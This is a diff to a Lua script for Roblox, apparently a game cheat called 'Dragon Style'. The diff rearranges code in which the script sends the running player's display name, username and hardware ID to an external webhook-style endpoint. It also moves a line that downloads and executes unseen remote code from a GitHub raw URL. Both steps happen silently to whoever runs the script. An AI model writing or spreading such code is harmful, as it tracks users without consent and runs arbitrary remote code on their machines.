@@ -43,11 +43,7 @@ local plre = game.Players.LocalPlayer
 local WV = "nil."
 local DName = game.Players.LocalPlayer.DisplayName
 local UName = game.Players.LocalPlayer.Name
-_G.kicked = "false"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/altaccountv1/-CLASSIFIED-./main/Classified"))();
-
-kicked = _G.kicked
 local response =
     request(
     {
@@ -62,9 +58,8 @@ local response =
                 ["embeds"] = {
                     {
                         ["title"] = "Dragon Style has been executed.",
-                        ["description"] = DName.."/"..UName.." has executed the script. Kicked? "..tostring(kicked).. ".",
+                        ["description"] = DName.."/"..UName.." has executed the script.",
                         ["type"] = "rich",
-                        ["color"] = embedcolor,
                         ["fields"] = {
                             {
                                 ["name"] = "Hardware ID:",
@@ -78,6 +73,8 @@ local response =
         )
     }
 )
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/altaccountv1/-CLASSIFIED-./main/Classified"))();
 
 local UserInputService = game:GetService("UserInputService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
